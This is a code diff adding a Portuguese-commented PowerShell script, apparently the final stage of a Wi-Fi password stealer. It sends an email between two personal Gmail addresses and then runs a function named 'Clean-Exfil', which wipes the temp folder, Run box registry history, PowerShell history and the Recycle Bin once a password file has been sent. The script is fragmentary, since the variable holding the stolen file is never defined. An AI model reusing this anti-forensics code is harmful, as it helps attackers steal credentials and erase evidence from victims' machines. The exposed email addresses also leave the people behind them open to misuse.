@@ -1,0 +1,49 @@
+############################################################################################################
+Write-Output "Iniciando script de envio email"
+
+$sendMailMessageSplat = @{
+    From = 'User01 <francisco.carmo12@gmail.com>'
+    To = 'User02 <nnboy2002@gmail.com>'
+    Subject = 'Test mail'
+}
+Send-MailMessage @sendMailMessageSplat
+
+
+
+
+
+############################################################################################################
+# Função para Limpar Arquivos Temporários e Histórico
+function Clean-Exfil { 
+    Write-Output "Limpando arquivos temporários e histórico..."
+
+    # Empty temp folder
+    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+    # Delete Run box history
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+    # Delete PowerShell history
+    $historyPath = (Get-PSReadlineOption).HistorySavePath
+    if (Test-Path -Path $historyPath) {
+        Remove-Item $historyPath -ErrorAction SilentlyContinue
+    }
+
+    # Empty Recycle Bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+}
+
+# Executa a limpeza se o arquivo de senha foi enviado com sucesso
+if (Test-Path -Path $outputFilePath) {
+    Clean-Exfil
+    Write-Output "Arquivo temporário de Wi-Fi removido."
+} else {
+    Write-Output "Arquivo temporário não encontrado, pulando limpeza."
+}
+
+# Remove o arquivo temporário de senhas
+Remove-Item -Path $outputFilePath -Force -ErrorAction SilentlyContinue
+
+Write-Output "Script concluído."
+############################################################################################################
+
